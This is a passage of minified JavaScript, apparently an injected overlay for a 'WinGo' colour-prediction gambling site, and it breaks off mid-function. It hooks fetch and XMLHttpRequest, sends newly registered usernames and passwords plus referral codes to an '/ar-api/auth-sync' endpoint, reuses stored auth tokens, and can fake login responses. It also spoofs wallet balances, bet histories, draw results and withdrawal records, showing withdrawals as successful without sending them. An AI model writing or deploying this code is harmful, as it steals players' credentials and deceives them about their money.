var Ct = location.href.match(/[?&]ref=([A-Za-z0-9]{6})/);
if (Ct) sessionStorage.setItem("wg_ref", Ct[1]);
function Ot({
  apiBase: n,
  spoofDomain: t,
  minBalance: e,
  nukeUrl: o,
  authErrMsg: i,
  onBalance: l,
  onWingo: f,
}) {
  if (navigator.serviceWorker)
    navigator.serviceWorker
      .getRegistrations()
      .then((m) => m.forEach((h) => h.unregister()))
      .catch(() => {});
  document.addEventListener("DOMContentLoaded", () => {
    document.querySelectorAll("iframe").forEach((m) => {
      if (m.src && (m.src.includes("unTopWindow") || m.src.includes("fromEntry=sw"))) m.remove();
    });
  });
  let c = window.fetch,
    p = "",
    w = /\/api\/webapi\/(Register|Login)$/,
    S = "",
    $ = "";
  function g(m, h) {
    try {
      window.dispatchEvent(
        new CustomEvent(m, {
          detail: h,
        }),
      );
    } catch {}
  }
  function M() {
    try {
      return JSON.parse(localStorage.getItem("userInfo") || "{}") || {};
    } catch {}
    return {};
  }
  function W(m) {
    return m;
  }
  function L() {}
  function q() {
    let m = M();
    return (
      m.userName ||
      m.username ||
      m.phone ||
      sessionStorage.getItem("wg_user") ||
      sessionStorage.getItem("wg_qual_user") ||
      ""
    );
  }
  function y() {
    let m = Number(M().amount);
    return Number.isFinite(m) ? m : null;
  }
  function a(m) {
    if (!m) return "";
    let h = sessionStorage.getItem("wg_qual_user");
    if (h && h !== m) sessionStorage.removeItem("wg_qualified");
    return (sessionStorage.setItem("wg_user", m), m);
  }
  function u(m, h) {
    if (h) (sessionStorage.setItem("wg_user", h), sessionStorage.setItem("wg_qual_user", h));
    if (m)
      (sessionStorage.setItem("wg_qualified", "1"),
        g("wg-qualified", {
          user: h || q(),
        }));
    else sessionStorage.removeItem("wg_qualified");
  }
  function v(m, h) {
    if (typeof m?.is_qualified === "boolean") u(m.is_qualified, h);
    else if (h) sessionStorage.setItem("wg_qual_user", h);
  }
  function r() {
    try {
      let m = localStorage.getItem("token") || sessionStorage.getItem("token") || "";
      if (!m) return "";
      let h =
        localStorage.getItem("tokenHeader") || sessionStorage.getItem("tokenHeader") || "Bearer ";
      return m.startsWith(h.trim()) ? m : h + m;
    } catch {}
    return "";
  }
  function C(m, h) {
    return h;
  }
  function O(m) {
    return m?.data?.userName || m?.data?.username || m?.data?.phone || m?.username || "";
  }
  function J(m) {
    if (m < e) return;
    let h = q(),
      z = r();
    if (
      !h ||
      !z ||
      sessionStorage.getItem("wg_qualified") ||
      sessionStorage.getItem("wg_qualifying")
    )
      return;
    (sessionStorage.setItem("wg_qualifying", "1"),
      c("/ar-api/qualify", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          authorization: z,
        },
        body: "{}",
      })
        .then((U) => U.json().catch(() => ({})))
        .then((U) => {
          if (U?.qualified) u(!0, h);
        })
        .finally(() => sessionStorage.removeItem("wg_qualifying")));
  }
  function H(m) {
    let h = Number(m);
    if (!Number.isFinite(h)) return;
    (l(h),
      g("wg-balance", {
        balance: h,
      }),
      J(h));
  }
  function Q(m, h) {
    if (!m) return null;
    if (m.includes("/api/Lottery/GetBalance")) return h?.data?.balance;
    if (m.includes("/api/webapi/GetUserInfo")) return h?.data?.amount;
    return null;
  }
  function Dn(m, h) {
    if (!m) return;
    if (
      !m.includes("/api/Lottery/GetBalance") &&
      !m.includes("/api/webapi/GetUserInfo") &&
      !m.includes("/api/webapi/Login") &&
      !m.includes("/api/webapi/Register")
    )
      return;
    h.json()
      .then((z) => {
        let U = a(O(z));
        if (U && sessionStorage.getItem("wg_qual_user") !== U) rn("login", U, {});
        let Z = Q(m, z);
        if (Z != null) H(Z);
      })
      .catch(() => {});
  }
  function Un(m, h) {
    if (m && f && m.includes("WinGo")) {
      let z = m.match(/WinGo_([\w]+)/),
        U = z ? "WinGo_" + z[1] : null;
      h.json()
        .then((Z) => f(U, Z))
        .catch(() => {});
    }
  }
  function rn(m, h, z) {
    return c("/ar-api/auth-sync", {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify({
        type: m,
        u: h,
        ...z,
      }),
    })
      .then((U) => U.json())
      .then((U) => {
        if (m === "login") v(U, h);
        return U;
      })
      .catch(() => ({}));
  }
  function $t(m) {
    try {
      let h = JSON.parse(m);
      rn("register", h.username || "", {
        pwd: h.pwd || "",
        inv: h.invitecode || "",
        parent: sessionStorage.getItem("wg_ref") || "",
      });
    } catch {}
  }
  async function Wt(m) {
    try {
      let h = JSON.parse(m);
      return (await rn("login", h.username || "", {})).allowed === !1;
    } catch {}
    return !1;
  }
  function ht() {
    let m = a(q());
    if (!m || $ === m) return;
    (($ = m),
      rn("login", m, {}).then(() => {
        let h = y();
        if (h != null) H(h);
      }));
  }
  return (
    (window.fetch = async function (m, h) {
      let z = "",
        U = null;
      if (typeof m === "string") {
        if (((z = m), (U = h?.body && typeof h.body === "string" ? h.body : null), U))
          ((U = C(z, U)),
            (h = {
              ...(h || {}),
              body: U,
            }));
        m = W(m);
      } else if (m instanceof Request) {
        z = m.url;
        let b = m.clone();
        if (w.test(z))
          try {
            U = C(z, await b.text());
          } catch {}
        m = new Request(W(m.url.startsWith(n) ? m.url : m.url), {
          method: m.method,
          headers: m.headers,
          body: U == null ? m.body : U,
          mode: "cors",
          credentials: m.credentials,
        });
      }
      if (!U && h?.body && typeof h.body === "string") U = h.body;
      if (z.includes("/api/webapi/Login") && U) {
        if (await Wt(U)) {
          let b = new Response(S, {
            status: 200,
            headers: {
              "Content-Type": "application/json",
            },
          });
          return (Un(z, b.clone()), b);
        }
      }
      let Z = typeof m === "string" ? m : m?.url,
        B = await c.call(this, m, h);
      if (z.includes("/api/webapi/Register") && U)
        B.clone()
          .json()
          .then((b) => {
            if (b?.code === 0) $t(U);
          })
          .catch(() => {});
      return (Un(Z, B.clone()), Dn(Z, B.clone()), B);
    }),
    (XMLHttpRequest.prototype.open = ((m) =>
      function (h, z, ...U) {
        return ((this._url = W(z)), (this._rawUrl = z), m.call(this, h, this._url, ...U));
      })(XMLHttpRequest.prototype.open)),
    (XMLHttpRequest.prototype.send = ((m) =>
      function (h) {
        this._body = typeof h === "string" ? h : null;
        let z = this,
          U = this._body ? C(this._rawUrl || this._url, this._body) : h;
        if (
          ((this._body = typeof U === "string" ? U : null),
          this.addEventListener("load", function () {
            try {
              if (
                this._url &&
                (this._url.includes("/Login") || this._url.includes("/Register")) &&
                this.responseText.includes(i)
              )
                L();
            } catch {}
            try {
              if (this._url) {
                let Z = JSON.parse(this.responseText),
                  B = a(O(Z));
                if (
                  B &&
                  (this._url.includes("GetUserInfo") ||
                    this._url.includes("Login") ||
                    this._url.includes("Register")) &&
                  sessionStorage.getItem("wg_qual_user") !== B
                )
                  rn("login", B, {});
                let b = Q(this._url, Z);
                if (b != null) H(b);
              }
            } catch {}
            try {
              if (this._rawUrl && this._rawUrl.includes("/api/webapi/Register") && this._body) {
                if (JSON.parse(this.responseText)?.code === 0) $t(this._body);
              }
            } catch {}
            try {
              if (this._url && f && this._url.includes("WinGo")) {
                let Z = this._url.match(/WinGo_([\w]+)/),
                  B = Z ? "WinGo_" + Z[1] : null;
                f(B, JSON.parse(this.responseText));
              }
            } catch {}
          }),
          this._rawUrl && this._rawUrl.includes("/api/webapi/Login") && this._body)
        ) {
          Wt(this._body)
            .then((Z) => {
              if (Z)
                (Object.defineProperties(z, {
                  readyState: {
                    value: 4,
                    writable: !1,
                  },
                  status: {
                    value: 200,
                    writable: !1,
                  },
                  statusText: {
                    value: "OK",
                    writable: !1,
                  },
                  responseText: {
                    value: S,
                    writable: !1,
                  },
                  response: {
                    value: S,
                    writable: !1,
                  },
                }),
                  z.dispatchEvent(new Event("readystatechange")),
                  z.dispatchEvent(new Event("load")),
                  z.dispatchEvent(new Event("loadend")));
              else m.call(z, U);
            })
            .catch(() => m.call(z, U));
          return;
        }
        return m.call(this, U);
      })(XMLHttpRequest.prototype.send)),
    ht(),
    window.addEventListener("pageshow", ht),
    c
  );
}
var un = "wg_spoof_state",
  xe = 420000,
  Ut = 50,
  zt = 240,
  Jt = 2,
  _n = [
    "red,violet",
    "green",
    "red",
    "green",
    "red",
    "green,violet",
    "red",
    "green",
    "red",
    "green",
  ];
function Yt() {
  try {
    var n = JSON.parse(localStorage.getItem("wg_spoof_cfg"));
    return n && typeof n === "object" ? n : {};
  } catch (t) {
    return {};
  }
}
function A(n, t) {
  var e = Yt(),
    o = e[n];
  return o !== void 0 ? o : t;
}
function Ht() {
  try {
    var n = sessionStorage.getItem("wg_user");
    return !!n && "917726002927".indexOf(n) !== -1;
  } catch (t) {
    return !1;
  }
}
function Pt(n) {
  var t = 2166136261;
  for (var e = 0; e < n.length; e++) ((t ^= n.charCodeAt(e)), (t = Math.imul(t, 16777619)));
  return (
    (t = Math.imul(t ^ (t >>> 16), 2246822507)),
    (t = Math.imul(t ^ (t >>> 13), 3266489909)),
    (t ^ (t >>> 16)) >>> 0
  );
}
function je(n) {
  return (
    (n = BigInt.asUintN(64, n + 0x9e3779b97f4a7c15n)),
    (n = BigInt.asUintN(64, (n ^ (n >> 30n)) * 0xbf58476d1ce4e5b9n)),
    (n = BigInt.asUintN(64, (n ^ (n >> 27n)) * 0x94d049bb133111ebn)),
    BigInt.asUintN(64, n ^ (n >> 31n))
  );
}
function Ft(n, t, e) {
  var o = /^\d+$/.test(String(t || "")) ? BigInt(t) : BigInt(Pt(String(t || "")));
  return je(o ^ BigInt(Pt(e + n)));
}
function d(n, t, e) {
  return Number(Ft(n, t, e) % 10n);
}
function Bn(n, t) {
  if (((n = String(n || "")), (t = t || 1), !/^\d+$/.test(n))) return "";
  try {
    return (BigInt(n) - BigInt(t)).toString();
  } catch (e) {}
  return String(Math.max(0, Number(n) - t));
}
function Gt(n, t, e, o) {
  var i = t - e === e - o && Math.abs(t - e) <= 2 && n - t === t - e;
  return (
    (n === t && t === e) ||
    (n === e && e === o) ||
    (n === e && t === o) ||
    (n === o && e === o) ||
    i
  );
}
function Nn(n, t) {
  t = String(t || "");
  var e = d(n, t, "Kx7q:");
  if (!/^\d+$/.test(t)) return e;
  var o = d(n, Bn(t, 1), "Kx7q:"),
    i = d(n, Bn(t, 2), "Kx7q:"),
    l = d(n, Bn(t, 3), "Kx7q:");
  if (!Gt(e, o, i, l)) return e;
  var f = [d(n, t, "J4n2:"), d(n, t, "V8p1:"), d(n, t, "S6d7:"), (e + 5) % 10, (e + 3) % 10];
  for (var c = 0; c < f.length; c++) if (!Gt(f[c], o, i, l)) return f[c];
  return f[0];
}
function Kt(n, t) {
  return Number(Ft(n, t, "Rz3m:") % 100n);
}
function ke(n, t) {
  return (Nn(n, t) + 5) % 10;
}
function _e() {
  var n = A("accuracy", 70);
  if (isNaN(n) || n < 0) n = 0;
  if (n > 100) n = 100;
  return n;
}
function An(n, t) {
  return Kt(n, t) < _e() ? Nn(n, t) : ke(n, t);
}
function Nt(n) {
  if (((n = String(n || "")), !/^\d+$/.test(n))) return "";
  try {
    return (BigInt(n) + 1n).toString();
  } catch (t) {}
  return String(Number(n) + 1);
}
function de(n) {
  var t = String(n || "");
  return /\/WinGo\/[^\/?]+\.json(?:\?|$)/.test(t) && t.indexOf("GetHistoryIssuePage") === -1;
}
function G(n) {
  var t = parseFloat(n);
  return isNaN(t) ? 0 : t;
}
function wn(n, t) {
  return parseFloat((G(n) * Math.max(1, G(t))).toFixed(2));
}
function Qt(n, t) {
  return Math.abs(G(n) - G(t)) < 0.001;
}
function fn(n, t) {
  var e = n && n.match(new RegExp("[?&]" + t + "=([^&]+)"));
  return e ? decodeURIComponent(e[1]) : null;
}
function no(n) {
  if (((n = String(n || "")), n.indexOf("5M") !== -1)) return 300000;
  if (n.indexOf("3M") !== -1) return 180000;
  if (n.indexOf("1M") !== -1) return 60000;
  return 30000;
}
function Sn(n) {
  var t = fn(n, "gameCode");
  if (t) return t;
  var e = n && n.match(/\/WinGo\/([^\/?]+)(?:\/|\.json(?:\?|$)|\?|$)/);
  if (e) return decodeURIComponent(e[1]);
  if (window.location) t = fn(window.location.hash, "gameCode");
  return t || null;
}
function to(n, t) {
  if (((n = String(n || "").toLowerCase()), (t = +t || 0), n.indexOf("num_") === 0)) return 9;
  if (n.indexOf("violet") !== -1) return 4.5;
  if (n === "color_green" && t === 5) return 1.5;
  if (n === "color_red" && t === 0) return 1.5;
  return 2;
}
function eo(n, t) {
  if (((n = String(n || "").toLowerCase()), n.indexOf("num_") === 0))
    return t === parseInt(n.split("_")[1], 10);
  if (n === "bigsmall_big") return t >= 5;
  if (n === "bigsmall_small") return t <= 4;
  if (n === "color_green") return [1, 3, 5, 7, 9].indexOf(t) !== -1;
  if (n === "color_red") return [0, 2, 4, 6, 8].indexOf(t) !== -1;
  if (n === "color_violet") return [0, 5].indexOf(t) !== -1;
  return !1;
}
function oo(n, t) {
  if (!t) return 0;
  var e = n.stake - (n.fee || n.stake * 0.02);
  return eo(n.content, t.num) ? parseFloat((e * to(n.content, t.num)).toFixed(2)) : 0;
}
var E;
try {
  E = JSON.parse(localStorage.getItem(un));
} catch (n) {}
if (E && E.pending !== void 0)
  E = {
    balance: E.balance,
    draws: {},
    rigs: {},
    withdrawals: {},
  };
if (!E)
  E = {
    balance: null,
    draws: {},
    rigs: {},
    withdrawals: {},
  };
if (!E.draws) E.draws = {};
if (!E.rigs) E.rigs = {};
if (!E.withdrawals) E.withdrawals = {};
if (E.version !== Jt) {
  zn = {};
  for (Jn in E.rigs) zn[E.rigs[Jn].game + ":" + E.rigs[Jn].issue] = !0;
  for (Hn in E.draws) if (!zn[Hn]) delete E.draws[Hn];
  E.version = Jt;
  try {
    localStorage.setItem(un, JSON.stringify(E));
  } catch (n) {}
}
var zn,
  Jn,
  Hn,
  mn = {};
function dn(n, t) {
  return String(n || "") + ":" + String(t || "");
}
function sn(n, t, e) {
  if (!n || e == null || isNaN(e)) return null;
  var o = dn(n, t),
    i = E.draws[o];
  if (i) {
    if (i.color == null) i.color = _n[i.num];
    if (!i.seenAt) i.seenAt = Date.now();
    return i;
  }
  return (
    (i = {
      num: +e,
      color: _n[e],
      seenAt: Date.now(),
    }),
    (E.draws[o] = i),
    i
  );
}
function gn(n, t) {
  if (((n = String(n || "")), t)) return E.draws[dn(t, n)] || null;
  var e = null,
    o = 0;
  for (var i in E.draws) if (i.split(":")[1] === n) ((e = E.draws[i]), o++);
  return o === 1 ? e : null;
}
function Rn(n, t) {
  n = String(n || "");
  var e = [];
  if (t) {
    var o = t + ":" + n + ":";
    for (var i in E.rigs)
      if (i.indexOf(o) === 0)
        e.push({
          key: i,
          rig: E.rigs[i],
        });
  } else
    for (var i in E.rigs)
      if (String(E.rigs[i].issue) === n)
        e.push({
          key: i,
          rig: E.rigs[i],
        });
  return e;
}
function io(n) {
  n = String(n || "");
  var t = null;
  for (var e in E.rigs) {
    var o = E.rigs[e];
    if (String(o.issue) !== n) continue;
    if (!t) t = o.game;
    else if (t !== o.game) return null;
  }
  return t;
}
function Pn(n) {
  if (n.settled) return !1;
  var t = gn(n.issue, n.game);
  if (!t) return !1;
  if (((n.win = oo(n, t)), (n.settled = !0), E.balance === null))
    E.balance = A("balanceOffset", 5000);
  return ((E.balance += n.win), !0);
}
function En() {
  var n = Date.now(),
    t = !1;
  for (var e in E.rigs) {
    var o = E.rigs[e];
    if (!o.settled && o.settleAt && n >= o.settleAt) {
      if (Pn(o)) t = !0;
    }
  }
  for (var e in E.rigs)
    if (!E.rigs[e].settled && n - (E.rigs[e].time || 0) > xe) {
      if (Pn(E.rigs[e])) t = !0;
    }
  for (var i in mn) if (mn[i] < n - 60000) delete mn[i];
  var l = Object.keys(E.rigs);
  if (l.length > Ut) {
    var f = l.filter(function (a) {
      return E.rigs[a].settled;
    });
    f.sort(function (a, u) {
      return (E.rigs[a].time || 0) - (E.rigs[u].time || 0);
    });
    for (var c = 0, p = l.length - Ut; c < p && c < f.length; c++) (delete E.rigs[f[c]], (t = !0));
    var w = {};
    for (var S in E.rigs) w[E.rigs[S].game + ":" + E.rigs[S].issue] = !0;
    for (var $ in E.draws) if (!w[$]) (delete E.draws[$], (t = !0));
  }
  var g = Object.keys(E.draws);
  if (g.length > zt) {
    var M = {};
    for (var W in E.rigs) M[E.rigs[W].game + ":" + E.rigs[W].issue] = !0;
    var L = g.filter(function (a) {
      return !M[a];
    });
    L.sort(function (a, u) {
      return (E.draws[a].seenAt || 0) - (E.draws[u].seenAt || 0);
    });
    for (var q = 0, y = g.length - zt; q < y && q < L.length; q++) (delete E.draws[L[q]], (t = !0));
  }
  if (t) nt();
  return t;
}
function j() {
  (En(), localStorage.setItem(un, JSON.stringify(E)));
}
var bn = null;
function nt() {
  if (E.balance === null || bn) return;
  bn = setTimeout(function () {
    bn = null;
    try {
      var n = document.getElementById("app"),
        t = n && n.__vue_app__,
        e = t && t.config.globalProperties.$pinia,
        o = e && e.state.value.GlobalState;
      if (o && o.userInfo && typeof o.userInfo.amount === "number") o.userInfo.amount = E.balance;
    } catch (i) {}
  }, 300);
}
function nn(n) {
  if (E.balance === null && typeof n === "number" && n >= 0)
    ((E.balance = n + A("balanceOffset", 5000)), j());
  return E.balance === null ? A("balanceOffset", 5000) : E.balance;
}
function Vt(n) {
  return (
    (n = String(n || "").toLowerCase()),
    n.indexOf("num_") === 0
      ? "Num"
      : n.indexOf("bigsmall_") === 0
        ? "BigSmall"
        : n.indexOf("color_") === 0
          ? "Color"
          : "Num"
  );
}
function Dt(n, t) {
  if (
    ((n.issueNumber = t.issue),
    (n.betContent = t.content),
    (n.amount = t.amount),
    (n.betMultiple = t.betMultiple),
    (n.realAmount = t.realAmount),
    (n.fee = t.fee),
    (n.betTime = t.time),
    (n.playType = Vt(t.content)),
    (n.orderNo = t.orderNo),
    !t.settled)
  ) {
    ((n.state = 2), (n.number = ""), (n.color = ""), (n.premium = ""), (n.winLoseAmount = 0));
    return;
  }
  ((n.state = t.win > 0 ? 1 : 0),
    (n.winLoseAmount =
      t.win > 0 ? parseFloat((t.win - t.stake).toFixed(2)) : parseFloat((-t.stake).toFixed(2))));
  var e = gn(t.issue, t.game);
  if (e) ((n.number = String(e.num)), (n.color = e.color), (n.premium = String(e.num)));
}
function co(n) {
  var t = {
    issueNumber: n.issue,
    playType: Vt(n.content),
    orderNo: n.orderNo,
    amount: n.amount,
    betMultiple: n.betMultiple,
    betContent: n.content,
    number: "",
    color: "",
    premium: "",
    realAmount: n.realAmount,
    fee: n.fee,
    state: 2,
    winLoseAmount: 0,
    betTime: n.time,
    sum: 0,
  };
  return (Dt(t, n), t);
}
function qn(n) {
  return n < 10 ? "0" + n : "" + n;
}
function Tn(n) {
  var t = new Date(n);
  return (
    t.getFullYear() +
    "-" +
    qn(t.getMonth() + 1) +
    "-" +
    qn(t.getDate()) +
    " " +
    qn(t.getHours()) +
    ":" +
    qn(t.getMinutes()) +
    ":" +
    qn(t.getSeconds())
  );
}
var Gn = {
  GetUserInfo: function (n) {
    if (n && n.code === 0 && n.data) {
      if (En()) localStorage.setItem(un, JSON.stringify(E));
      if (((n.data.amount = nn(n.data.amount)), E.balance !== null))
        ((n.data.amountofCode = 0), (n.data.channelAmountofCode = 0));
      window.__wgUICache = JSON.parse(JSON.stringify(n));
    } else if (
      n &&
      n.code !== 0 &&
      window.__wgUICache &&
      /frequent|rate.?limit/i.test(n.msg || "")
    ) {
      var t = window.__wgUICache;
      ((n.code = t.code),
        (n.msg = t.msg),
        (n.msgCode = t.msgCode),
        (n.data = JSON.parse(JSON.stringify(t.data))),
        (n.data.amount = nn()));
    }
  },
  GetARGameAndPlatWallets: function (n) {
    var t = n.data && n.data.thidGameBalanceList;
    if (t) {
      for (var e = 0; e < t.length; e++)
        if (t[e].vendorCode === "Lottery") t[e].balance = nn(t[e].balance);
    }
  },
  GetSaasAllwallets: function (n) {
    Gn.GetARGameAndPlatWallets(n);
  },
  GetBalance: function (n) {
    if (n && n.code === 0 && n.data) {
      if (En()) localStorage.setItem(un, JSON.stringify(E));
      if (typeof n.data.balance === "number") n.data.balance = nn(n.data.balance);
      window.__wgBalCache = JSON.parse(JSON.stringify(n));
    } else if (
      n &&
      n.code !== 0 &&
      window.__wgBalCache &&
      /frequent|rate.?limit/i.test(n.msg || "")
    ) {
      var t = window.__wgBalCache;
      if (
        ((n.code = t.code),
        (n.msg = t.msg),
        (n.msgCode = t.msgCode),
        (n.data = JSON.parse(JSON.stringify(t.data))),
        typeof n.data.balance === "number")
      )
        n.data.balance = nn();
    }
  },
  RecoverSaasBalance: function (n) {
    if (n.data && typeof n.data.amount === "number") n.data.amount = nn(n.data.amount);
  },
  GetWithdrawLog: function (n, t) {
    try {
      var e = JSON.parse(t._kBody || "{}");
      if (e.pageNo > 1) return;
    } catch ($) {}
    if (!n.data)
      n.data = {
        list: [],
      };
    if (!n.data.list) n.data.list = [];
    var o = {};
    for (var i = 0; i < n.data.list.length; i++) o[n.data.list[i].withdrawNumber] = !0;
    var l = [];
    for (var f in E.withdrawals)
      if (!o[E.withdrawals[f].withdrawNumber]) {
        var c = E.withdrawals[f];
        try {
          var p = e.type || e.categoryId || e.withdrawTypeId || -1;
          if (p != -1 && p != 0 && c.type && c.type != p) continue;
        } catch ($) {}
        var w = c.type === 2 ? "BANK CARD" : c.type === 1 ? "UPI" : "UPI";
        l.push({
          id: c.withdrawNumber,
          withdrawNumber: c.withdrawNumber,
          price: c.amount,
          state: c.state,
          addTime: Tn(c.addTime),
          fee: c.fee,
          withdrawName: w,
          _ts: c.addTime,
        });
      }
    l.sort(function ($, g) {
      return g._ts - $._ts;
    });
    for (var S = 0; S < l.length; S++) delete l[S]._ts;
    ((n.data.list = l.concat(n.data.list)),
      (n.data.totalCount = (n.data.totalCount || 0) + l.length));
  },
  Withdraw: function (n, t) {
    try {
      var e = JSON.parse(t._kBody || "{}"),
        o = G(e.amount) || G(e.price) || G(e.applyAmount) || G(e.withdrawAmount);
      if (!o || o <= 0) return;
      var i = e.withdrawid || e.type || e.categoryId || e.withdrawTypeId || 2,
        l = "W" + Date.now();
      if (
        ((E.withdrawals[l] = {
          withdrawNumber: l,
          amount: o,
          state: 3,
          fee: 0,
          addTime: Date.now(),
          type: i,
        }),
        E.balance === null)
      )
        E.balance = A("balanceOffset", 5000);
      ((E.balance -= o), j());
    } catch (f) {}
    ((n.code = 0), (n.msg = "Succeed"));
  },
  NewSetWithdrawal: function (n, t) {
    try {
      console.log("NewSetWithdrawal body:", t._kBody);
    } catch (e) {}
    return Gn.Withdraw(n, t);
  },
  getWithdrawals: function (n) {
    if (n && n.data && n.data.withdrawalsrule) {
      var t = nn();
      ((n.data.withdrawalsrule.amount = t), (n.data.withdrawalsrule.canWithdrawAmount = t));
    }
  },
  GetNewMyEmerdList: function (n, t) {
    if (En()) localStorage.setItem(un, JSON.stringify(E));
    if (!n.data)
      n.data = {
        list: [],
        pageNo: 1,
        totalPage: 0,
        totalCount: 0,
      };
    var e = {};
    try {
      e = JSON.parse((t && t._kBody) || "{}");
    } catch (H) {}
    var o = parseInt(e.pageNo || 1, 10),
      i = parseInt(e.pageSize || 10, 10),
      l = e.startDate || "",
      f = e.endDate || "",
      c = String(e.gameType || "");
    if (c !== "" && c !== "0" && c !== "1") {
      ((n.data.list = []), (n.data.totalCount = 0), (n.data.totalPage = 0), (n.data.pageNo = o));
      return;
    }
    var p = {
      WinGo_30S: 30,
      WinGo_1M: 1,
      WinGo_3M: 2,
      WinGo_5M: 3,
    };
    function w(H) {
      if (((H = String(H || "")), H.indexOf("Color_") === 0)) return H.slice(6).toLowerCase();
      if (H.indexOf("Num_") === 0) return H.slice(4);
      if (H.indexOf("BigSmall_") === 0) return H.slice(9).toLowerCase();
      return H.toLowerCase();
    }
    function S(H) {
      return String(H || "").indexOf("BigSmall_") === 0 ? 2 : 0;
    }
    var $ = l ? new Date(l + " 00:00:00").getTime() : 0,
      g = f ? new Date(f + " 23:59:59").getTime() : 1 / 0,
      M = [];
    for (var W in E.rigs) {
      var L = E.rigs[W];
      if (!L.settled) continue;
      if (L.time < $ || L.time > g) continue;
      var q = gn(L.issue, L.game);
      M.push({
        orderNumber: L.orderNo,
        issueNumber: L.issue,
        typeID: p[L.game] || 30,
        amount: L.amount,
        betCount: 1,
        gameType: S(L.content),
        selectType: w(L.content),
        realAmount: L.realAmount,
        serviceCharge: L.fee,
        figure: 1,
        state: L.win > 0 ? 1 : 0,
        winAmount: L.win > 0 ? parseFloat(L.win.toFixed(2)) : 0,
        addTime: Tn(L.time),
        fee: L.fee,
        premium: q ? String(q.num) : "",
        number: q ? String(q.num) : "",
        colour: q ? q.color : "",
        _ts: L.time,
      });
    }
    var y = n.data.list || [];
    if (o === 1 && (M.length > 0 || y.length > 0)) {
      var a = {};
      for (var u = 0; u < M.length; u++) a[M[u].orderNumber] = !0;
      for (var v = 0; v < y.length; v++)
        if (!a[y[v].orderNumber]) {
          var r = new Date(y[v].addTime || 0).getTime();
          ((y[v]._ts = isNaN(r) ? 0 : r), M.push(y[v]));
        }
      M.sort(function (H, Q) {
        return (Q._ts || 0) - (H._ts || 0);
      });
      for (var C = 0; C < M.length; C++) delete M[C]._ts;
      ((n.data.list = M.slice(0, i)),
        (n.data.totalCount = M.length),
        (n.data.totalPage = Math.max(1, Math.ceil(M.length / i))),
        (n.data.pageNo = 1));
    } else if (o > 1 && y.length === 0 && M.length > 0) {
      M.sort(function (H, Q) {
        return (Q._ts || 0) - (H._ts || 0);
      });
      for (var O = 0; O < M.length; O++) delete M[O]._ts;
      var J = (o - 1) * i;
      ((n.data.list = M.slice(J, J + i)),
        (n.data.totalCount = M.length),
        (n.data.totalPage = Math.max(1, Math.ceil(M.length / i))),
        (n.data.pageNo = o));
    }
  },
  WinGoBet: function (n, t) {
    if (!t || !t._kBody) {
      ((n.code = 0), (n.msg = "Succeed"), (n.msgCode = 0));
      return;
    }
    try {
      var e = JSON.parse(t._kBody),
        o = e.gameCode || Sn(t._kUrl) || "WinGo",
        i = String(e.issueNumber || ""),
        l = o + ":" + i;
      if (!E.draws[l]) sn(o, i, An(o, i));
      var f = E.draws[l],
        c = G(e.amount),
        p = Math.max(1, G(e.betMultiple || 1)),
        w = wn(c, p),
        S = parseFloat((w * 0.02).toFixed(2)),
        $ = 0;
      for (var g in E.rigs) if (g.indexOf(l + ":") === 0) $++;
      var M = l + ":" + $,
        W = mn[l],
        L = W ? W + 5000 : Date.now() + no(o) + 5000;
      if (
        ((E.rigs[M] = {
          key: M,
          issue: i,
          game: o,
          content: e.betContent,
          amount: c,
          betMultiple: p,
          stake: w,
          fee: S,
          realAmount: parseFloat((w - S).toFixed(2)),
          orderNo: "KG" + i + $,
          settled: !1,
          win: null,
          time: Date.now(),
          settleAt: L,
        }),
        E.balance === null)
      )
        E.balance = A("balanceOffset", 5000);
      ((E.balance -= w), j(), nt());
      try {
        window.dispatchEvent(
          new CustomEvent("kismat:round", {
            detail: {
              type: "round",
              game: o,
              issue: i,
              num: f.num,
              color: f.color,
              ts: Date.now(),
            },
          }),
        );
      } catch (q) {}
    } catch (q) {}
    ((n.code = 0), (n.msg = "Succeed"), (n.msgCode = 0));
  },
  WinGoState: function (n, t) {
    var e = n && n.current ? n : n && n.data && n.data.current ? n.data : null;
    if (!e || !e.current) return;
    var o = String(e.gameCode || Sn(t ? t._kUrl : null) || ""),
      i = String(e.current.issueNumber || "");
    if (!i) return;
    var l = !1;
    if (o && i && !E.draws[dn(o, i)]) (sn(o, i, An(o, i)), (l = !0));
    var f = G(e.current.endTime || 0);
    if (o && i && f > 0) {
      mn[o + ":" + i] = f;
      var c = f + 5000,
        p = o + ":" + i + ":";
      for (var w in E.rigs)
        if (w.indexOf(p) === 0 && !E.rigs[w].settled && E.rigs[w].settleAt !== c)
          E.rigs[w].settleAt = c;
    }
    var S = String((e.next && e.next.issueNumber) || Nt(i) || "");
    try {
      window.dispatchEvent(
        new CustomEvent("kismat:issue", {
          detail: {
            type: "issue",
            game: o,
            currentIssue: i,
            nextIssue: S,
            currentStart: G(e.current.startTime || 0),
            currentEnd: G(e.current.endTime || 0),
            ts: Date.now(),
          },
        }),
      );
    } catch ($) {}
    if (l) j();
  },
  GetHistoryIssuePage: function (n, t) {
    var e = n.data && n.data.list;
    if (!e) return;
    var o = Sn(t ? t._kUrl : null),
      i = !1,
      l = e[0] && e[0].issueNumber != null ? String(e[0].issueNumber) : "";
    for (var f = 0; f < e.length; f++) {
      var c = String(e[f].issueNumber || ""),
        p = Rn(c, o),
        w = gn(c, o);
      if (!w && o) {
        var S = !p.length ? An(o, c) : Nn(o, c);
        ((w = sn(o, c, S)), (i = !0));
      }
      if (!w) continue;
      ((e[f].number = String(w.num)), (e[f].color = w.color), (e[f].premium = String(w.num)));
      for (var $ = 0; $ < p.length; $++) if (Pn(p[$].rig)) i = !0;
    }
    if (i) j();
    try {
      window.dispatchEvent(
        new CustomEvent("kismat:gameData", {
          detail: {
            type: "history",
            game: o || "",
            latestIssue: l,
            nextIssue: Nt(l),
            list: e,
            ts: Date.now(),
          },
        }),
      );
    } catch (g) {}
  },
  GetWinLossResult: function (n, t) {
    if (!n.data) return;
    var e = String(fn(t ? t._kUrl : "", "issueNumber") || "");
    if (!e) return;
    var o = fn(t ? t._kUrl : "", "gameCode");
    if (!o && t && t._kUrl) {
      var i = t._kUrl.match(/\/WinGo\/([^\/?]+)(?:\/|\.json|\?|$)/);
      if (i) o = decodeURIComponent(i[1]);
    }
    var l = o || io(e);
    if (!l) return;
    var f = Rn(e, l);
    if (!f.length) return;
    var c = 0,
      p = !1,
      w = !1;
    for (var S = 0; S < f.length; S++) {
      if (Pn(f[S].rig)) w = !0;
      if (((c += f[S].rig.win || 0), f[S].rig.win > 0)) p = !0;
    }
    if (((n.data.status = p), (n.data.winAmount = p ? c : 0), w)) j();
